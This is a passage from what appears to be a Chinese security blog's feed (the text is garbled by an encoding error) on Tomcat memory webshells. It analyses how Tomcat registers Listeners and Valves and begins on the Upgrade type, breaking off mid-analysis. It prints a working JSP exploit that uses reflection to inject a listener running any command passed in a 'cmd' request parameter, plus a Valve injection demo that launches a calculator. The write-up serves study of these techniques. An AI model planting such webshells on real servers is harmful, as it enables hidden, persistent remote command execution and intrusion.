å®¹å™¨ï¼Œå¹¶ä¸”å®¹å™¨å†³å®šä¸ºè¯¥è¯·æ±‚åˆ›å»ºä¸€ä¸ªæ–°çš„ ServletRequest å¯¹è±¡æ—¶ã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥ç”¨æ¥åˆå§‹åŒ–è¯·æ±‚ç›¸å…³çš„èµ„æºï¼Œæ¯”å¦‚è®¾ç½®è¯·æ±‚å±æ€§æˆ–è€…å¯åŠ¨è·Ÿè¸ªè¯·æ±‚çŠ¶æ€çš„é€»è¾‘ã€‚<br><br>2.void requestDestroyed(ServletRequestEvent sre)ï¼š<br>è¿™ä¸ªæ–¹æ³•åœ¨ Servlet è¯·æ±‚å¯¹è±¡å³å°†è¢«é”€æ¯æ—¶è¢«è°ƒç”¨ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨è¯·æ±‚å¤„ç†å®Œæˆï¼Œå“åº”å·²ç»å‘é€ç»™å®¢æˆ·ç«¯ä¹‹åã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥ç”¨æ¥æ¸…ç†è¯·æ±‚ç›¸å…³çš„èµ„æºï¼Œæ¯”å¦‚å…³é—­æ•°æ®åº“è¿æ¥æˆ–è€…æ¸…ç†åœ¨ requestInitialized æ–¹æ³•ä¸­åˆ›å»ºçš„ä»»ä½•å¯¹è±¡ã€‚<br></code></pre></td></tr></table></figure><p>å¯ä»¥å†™ä¸€ä¸ªç®€å•çš„demoæµ‹è¯•ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenerTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Listener è°ƒç”¨&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;servlet ç¦»å¼€&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é…ç½®web.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.clown.servletshell.ListenerTest<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure><h2><span id="æµç¨‹åˆ†æ">æµç¨‹åˆ†æ</span></h2><p>æ¥ä¸‹æ¥å°±æ˜¯ç…§å¸¸åˆ†æä¸€ä¸‹Listeneræ˜¯æ€ä¹ˆæ³¨å†Œçš„äº†</p><p>è¿™é‡Œç›´æ¥ä»<strong>ContextConfig#configureContext</strong>é‚£é‡Œå¼€å§‹åˆ†æï¼Œä¹Ÿå°±æ˜¯è®¿é—®å‰çš„è¿‡ç¨‹</p><p>é‚£å°±å†å»è¯»å–web.xmlçš„é‚£ä¸ªåœ°æ–¹çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202409191119893.png" alt="image-20240919111941724"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œåœ¨æ·»åŠ filterä¹‹åå°±å°†listenerçš„å…¨ç±»åè¿›è¡Œæ·»åŠ ï¼Œè°ƒç”¨StandardContext#addApplicationListeneræ–¹æ³•</p><p>æ·»åŠ ä¹‹åä»–ä¼šè°ƒç”¨StandardContext#listenerStart</p><p><img src="https://cdn.clown2024.cn/202409191139786.png" alt="image-20240919113903688"></p><p>ç„¶åè¿™é‡Œä¼šæŸ¥æ‰¾æˆ‘ä»¬æ·»åŠ çš„listenerï¼Œåˆ°è¿™æ­¥çš„ä»£ç æ¯”è¾ƒå¤æ‚å°±ä¸è°ƒäº†ï¼Œæœ‰ä¸ªæ•°å°±è¡Œ</p><p><strong>ç„¶åæˆ‘ä»¬å»è®¿é—®ç½‘é¡µ</strong>ï¼Œçœ‹ä¸€ä¸‹è¯·æ±‚è¿‡æ¥æ—¶listeneråœ¨å“ªé‡Œè°ƒç”¨çš„</p><p><img src="https://cdn.clown2024.cn/202409191143445.png" alt="image-20240919114327349"></p><p>è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ç„¶åçœ‹çœ‹è°ƒç”¨æ ˆï¼Œçœ‹å“ªä¸€ä¸ªå‡½æ•°æœ€é‡è¦</p><p><img src="https://cdn.clown2024.cn/202409191144058.png" alt="image-20240919114444926"></p><p>æœ€é‡è¦çš„åº”è¯¥æ˜¯è¿™ä¸ªå‡½æ•°StandardContext#fireRequestInitEvent</p><p>é‡æ–°å°†æ–­ç‚¹ä¸‹åœ¨è¿™é‡Œçœ‹ä¸€çœ‹</p><p><img src="https://cdn.clown2024.cn/202409191151789.png" alt="image-20240919115146689"></p><p>å¯ä»¥çœ‹åˆ°å®ƒæ¥å—äº†requestè¯·æ±‚å‚æ•°ç„¶åè¿›è¡Œç›¸å…³æ“ä½œï¼Œç„¶åè¿™é‡Œè·å–ä¸€ä¸ªlisteneræ•°ç»„</p><p>æˆ‘ä»¬è¿›è¯¥æ–¹æ³•çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202409191155718.png" alt="image-20240919115507610"></p><p>å¯ä»¥çœ‹åˆ°applicationEventListenersListé‡Œé¢çš„å°±æ˜¯æˆ‘ä»¬çš„listener</p><p>è€Œä¸”StandardContextè¿˜æœ‰å¯¹åº”çš„æ·»åŠ listenerçš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202409191156621.png" alt="image-20240919115656529"></p><p>ç„¶åå°±æ˜¯åˆ°ä¸‹é¢éå†è§¦å‘æˆ‘ä»¬å®šä¹‰çš„listenerçš„requestInitialized()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409191200195.png" alt="image-20240919120033087"></p><p>åˆ°è¿™é‡Œæµç¨‹å°±ç»“æŸï¼Œè¿™éƒ¨åˆ†çœ‹èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„</p><p>ç›¸å¯¹åº”çš„è¯·æ±‚ç»“æŸçš„æ—¶å€™å°±ä¼šè°ƒç”¨fireRequestDestroyEventæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409191232040.png" alt="image-20240919120248808"></p><h2><span id="å†…å­˜é©¬ç¼–å†™">å†…å­˜é©¬ç¼–å†™</span></h2><p>é€šè¿‡ä¸Šé¢çš„æµç¨‹åˆ†æï¼Œexpçš„ç¼–å†™æ­¥éª¤ä¹Ÿå¾ˆç®€å•ï¼š</p><p>å°±æ˜¯é€šè¿‡ StandardContext ç±»çš„ <code>addApplicationEventListener()</code> æ–¹æ³•æŠŠæ¶æ„çš„ Listenerå®ä¾‹æ”¾è¿›å»ï¼Œç„¶åæ¶æ„ä»£ç å†™åœ¨requestInitialized()æ–¹æ³•é‡Œé¢å³å¯</p><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//è·å–standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//åˆ›å»ºæ¶æ„listener</span><br>    <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">servletRequestListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestListener</span>()&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br><br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//æ·»åŠ ç›‘å¬å™¨</span><br>    standardContext.addApplicationEventListener(servletRequestListener);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åç¾ç¾ç™½å±å¼¹è®¡ç®—å™¨</p><p><img src="https://cdn.clown2024.cn/202409191342329.png" alt="image-20240919134253239"></p><p><img src="https://cdn.clown2024.cn/202409191342142.png" alt="image-20240919134258008"></p><blockquote><p>è¿™é‡Œæˆ‘è®¤ä¸ºæ˜¯å¹¶æ²¡æœ‰ç›¸å…³è·¯å¾„çš„åŒ¹é…é€»è¾‘ï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨è®¿é—®å‰çš„é‚£éƒ¨åˆ†æ³¨å†Œ</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™é‡Œæ˜¯æœ¬èœé¸¡å¼€å§‹å­¦ä¹ å†…å­˜é©¬çš„èµ·å§‹æ–‡ç« &lt;/p&gt;
&lt;p&gt;æœ‰å…³å†…å­˜é©¬çš„è®¤çŸ¥å¯ä»¥çœ‹çœ‹su18å¸ˆå‚…çš„è¿™ç¯‡æ–‡ç« ï¼š&lt;a href=&quot;https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ&quot;&gt;https://mp.weixin.qq.com/s/</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="å†…å­˜é©¬" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Tomcatä¸­é—´ä»¶å†…å­˜é©¬</title>
    <link href="https://clowsman.github.io/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://clowsman.github.io/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-14T12:54:29.000Z</published>
    <updated>2024-09-23T01:57:14.812Z</updated>
    
    <content type="html"><![CDATA[<p>å…¶å®å‰é¢çš„ä¼ ç»Ÿwebåº”ç”¨å†…å­˜é©¬ä¹Ÿæ˜¯tomcatè¿™éƒ¨åˆ†çš„ï¼Œå› ä¸ºå®ƒåŸºäºtomcatè¿›è¡Œåˆ†æä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œåˆ«çš„ä¸­é—´ä»¶åº”è¯¥ä¹Ÿæ˜¯æœ‰è¿™äº›åŸºæœ¬ç»„ä»¶çš„ã€‚</p><h1><span id="tomcat-valveå†…å­˜é©¬">Tomcat-Valveå†…å­˜é©¬</span></h1><p>valveå°±æ˜¯å‰é¢æ–‡ç« ä¸­è¯´è¿‡çš„é˜€é—¨ï¼Œä¹Ÿå°±æ˜¯pipeline(ç®¡é“)æœºåˆ¶ï¼Œæƒ³äº†è§£å¾—æ›´åŠ ç»†è‡´ä¸€ç‚¹å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%89%8D%E6%96%87%E6%8F%90%E5%88%B0%E7%9A%84%E6%80%BB%E7%BB%93%E5%A4%A7%E5%85%A8%E6%96%87%E7%AB%A0%E3%80%82">https://www.cnblogs.com/coldridgeValley/p/5816414.htmlï¼Œä¹Ÿå¯ä»¥çœ‹å‰æ–‡æåˆ°çš„æ€»ç»“å¤§å…¨æ–‡ç« ã€‚</a></p><p>è¿™é‡Œæ”¾ä¸€å¼ Valveçš„è¿è¡Œæœºåˆ¶å›¾</p><p><img src="https://cdn.clown2024.cn/202409211418602.png" alt="image-20240921141822546"></p><h2><span id="åŸç†åˆ†æ">åŸç†åˆ†æ</span></h2><p>ç»è¿‡å‰é¢çš„å­¦ä¹ ï¼Œç°åœ¨åˆ†æèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿™é‡Œå°±ä¸è‡ªå·±é…ä¸€ä¸ªvalveäº†ï¼Œå› ä¸ºvalveå±äºå®¹å™¨ï¼Œéœ€è¦åœ¨server.xmlæˆ–è€…context.xmlé‚£é‡Œé…ç½®ï¼Œçœ‹çœ‹æ–‡ç« å°±è¡Œï¼Œæˆ–è€…åƒæ–‡ç« é‡Œç›´æ¥ç”¨springbootæ¥æ­å»ºã€‚</p><blockquote><p>Pipelineå®šä¹‰å¯¹åº”çš„æ¥å£æ˜¯Pipelineï¼Œä»–çš„å®ç°ç±»æ˜¯StandardPipelineï¼ŒValveå®šä¹‰å¯¹åº”æ¥å£Valveï¼Œä»–çš„æŠ½è±¡å®ç°ç±»æ˜¯ValveBaseï¼Œç„¶åå››ä¸ªå®¹å™¨æœ¬èº«æœ‰çš„é˜€é—¨ä¸ºStandardEngineValveï¼ŒStandardHostValveï¼ŒStandardContextValveï¼ŒStandardWrapperValveã€‚</p></blockquote><p>è¿™é‡Œç›´æ¥çœ‹æºç åˆ†æ</p><p><img src="https://cdn.clown2024.cn/202409211514128.png" alt="image-20240921151457990"></p><p>æˆ‘ä»¬åœ¨è®¿é—®filterçš„æ—¶å€™å¯ä»¥ä»è°ƒç”¨æ ˆçœ‹åˆ°å¾ˆå¤šçš„valveï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹ä¸€ä¸‹è¿™äº›wrapperValve</p><p><img src="https://cdn.clown2024.cn/202409211518432.png" alt="image-20240921151844389"></p><p>å¯ä»¥çœ‹åˆ°ç»§æ‰¿çš„æ˜¯ValveBaseè¿™ä¸ªç±»ï¼Œè¿™ä¸ªç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œç„¶åå®ƒåˆå®ç°äº†Valveæ¥å£ï¼Œçœ‹ä¸€ä¸‹Valveæ¥å£æœ‰ä»€ä¹ˆï¼Œç›´æ¥copyä¸€ä¸‹æ–‡ç« çš„å†…å®¹ï¼Œå› ä¸ºä»–åŠ äº†æ³¨é‡Š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.catalina;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Request;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Response;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-comment">// è·å–ä¸‹ä¸€ä¸ªé˜€é—¨</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// è®¾ç½®ä¸‹ä¸€ä¸ªé˜€é—¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<br>    <span class="hljs-comment">// åå°æ‰§è¡Œé€»è¾‘ï¼Œä¸»è¦åœ¨ç±»åŠ è½½ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨åˆ°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// æ‰§è¡Œä¸šåŠ¡é€»è¾‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-comment">// æ˜¯å¦å¼‚æ­¥æ‰§è¡Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹æ¯ä¸€çº§çš„Valveæ˜¯æ€ä¹ˆè°ƒç”¨çš„</p><p><img src="https://cdn.clown2024.cn/202409211533484.png" alt="image-20240921153326414"></p><p>åœ¨Hostè°ƒç”¨Contextçš„</p><p><img src="https://cdn.clown2024.cn/202409211533055.png" alt="image-20240921153355996"></p><p>åœ¨Contextè°ƒç”¨Wrapperçš„</p><p>ç„¶åæˆ‘ä»¬é‡æ–°ä¸‹æ–­ç‚¹ä»context.getPipelineå¼€å§‹çœ‹ï¼Œåˆ©ç”¨ç‚¹ä»è¿™é‡Œå¼€å§‹ï¼Œå› ä¸ºæˆ‘ä»¬å¥½è·å–çš„å°±æ˜¯context</p><p><img src="https://cdn.clown2024.cn/202409211538211.png" alt="image-20240921153810150"></p><p>è¿™é‡Œä¼šèµ°åˆ°çˆ¶ç±»çš„ContainerBaseçš„getPipelineæ–¹æ³•ï¼ŒContainerBaseæ˜¯æ‰€æœ‰å®¹å™¨çš„æŠ½è±¡çˆ¶ç±»</p><p><img src="https://cdn.clown2024.cn/202409211539334.png" alt="image-20240921153916289"></p><p>ç„¶åæˆ‘ä»¬å»çœ‹çœ‹è¿™ä¸ªpipeline</p><p><img src="https://cdn.clown2024.cn/202409211540918.png" alt="image-20240921154014879"></p><p>æ˜¯ä¸€ä¸ªStandardPipelineç±»ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´è¿‡çš„Pipelineçš„å®ç°ç±»</p><p><img src="https://cdn.clown2024.cn/202409211541679.png" alt="image-20240921154104632"></p><p>çœ‹çœ‹Pipelineçš„æ¥å£æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409211541979.png" alt="image-20240921154142926"></p><p>å¯ä»¥çœ‹åˆ°æœ‰addVavleæ–¹æ³•ï¼Œé‚£ä¹ˆStandardPipelineå°±æœ‰ç›¸åº”çš„å®ç°æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409211543271.png" alt="image-20240921154312200"></p><p>é‚£æˆ‘ä»¬æ‰“å†…å­˜é©¬çš„æ€è·¯å°±å‡ºæ¥äº†</p><p>æˆ‘ä»¬åªéœ€è¦åˆ©ç”¨context.getPipelineç„¶åaddVavleè¿›å»ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±å†™çš„æ¶æ„valveå³å¯</p><h2><span id="å†…å­˜é©¬ç¼–å†™">å†…å­˜é©¬ç¼–å†™</span></h2><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Valve&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.è·å–standardContext</span><br>    <span class="hljs-comment">//è·å–ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-comment">//è·å–StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//è·å–Pipeline</span><br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>    <span class="hljs-comment">//æ·»åŠ æ¶æ„Valve</span><br>    pipeline.addValve(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Valve</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">//æ¶æ„ä»£ç </span><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½ç™½å±å¼¹è®¡ç®—å™¨</p><p><img src="https://cdn.clown2024.cn/202409211550418.png" alt="image-20240921155025355"></p><p><img src="https://cdn.clown2024.cn/202409211550385.png" alt="image-20240921155045287"></p><p>åœ¨è¿™ç¯‡æ–‡ç« çœ‹åˆ°ä¸€ä¸ªæ›´ç®€å•çš„è·å–standardContextçš„æ–¹æ³•ï¼š<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ›´ç®€å•çš„æ–¹æ³• è·å–StandardContext  </span><br> <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);  <br> reqF.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);  <br> <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext(); <br></code></pre></td></tr></table></figure><h1><span id="tomcat-upgradeå†…å­˜é©¬">Tomcat-Upgradeå†…å­˜é©¬</span></h1><h2><span id="åŸç†åˆ†æ">åŸç†åˆ†æ</span></h2><p>è¿™é‡Œå‚è€ƒæ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw">https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw</a></p><p>æ”¾ä¸€å¼ æ–‡ç« çš„è¿æ¥å™¨å›¾</p><p><img src="https://cdn.clown2024.cn/202409222103688.webp" alt="å›¾ç‰‡"></p><p>è¯¥å†…å­˜é©¬å°±æ˜¯åœ¨åˆ°è¾¾Containerä¹‹å‰çš„åˆ©ç”¨ï¼Œå› ä¸ºå¯èƒ½ä¼šç”±äºFilterçš„è¿‡æ»¤æˆ–è€…åä»£å¯¼è‡´æˆ‘ä»¬æ‰¾ä¸åˆ°è·¯å¾„ï¼Œå¯¼è‡´æˆ‘ä»¬çš„åˆ©ç”¨Containerå†…ç»„ä»¶çš„å†…å­˜é©¬æ— æ³•ä½¿ç”¨</p><p>é¦–å…ˆæŠ½è±¡ç±»<strong>AbstractProcessorLight</strong>çš„processæ–¹æ³•ä¸­ï¼Œä¼šæ ¹æ®å½“å‰<code>SocketWrapperBase</code>çš„çŠ¶æ€è¿›è¡Œå“åº”ï¼Œåœ¨<code>OPEN_READ</code>çŠ¶æ€æ—¶ï¼Œä¼šè°ƒç”¨å¯¹åº”çš„<code>Processor</code>çš„serviceæ–¹æ³•è¿›è¡Œå¤„ç†</p><p><img src="https://cdn.clown2024.cn/202409222122170.png" alt="image-20240922212210064"></p><p>è¿™é‡ŒHttpè¯·æ±‚è°ƒç”¨çš„å°±æ˜¯Http11Processor#serviceï¼Œç„¶åå®ƒé‡Œé¢æœ‰å¤„ç†Upgradeçš„é€»è¾‘</p><p><img src="https://cdn.clown2024.cn/202409222127551.png" alt="image-20240922212744457"></p><p>è¿™é‡Œçš„protocolæ˜¯Http11NioProtocolï¼Œçœ‹ä¸€ä¸‹ä»–çš„getUpgradeProtocolæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222129320.png" 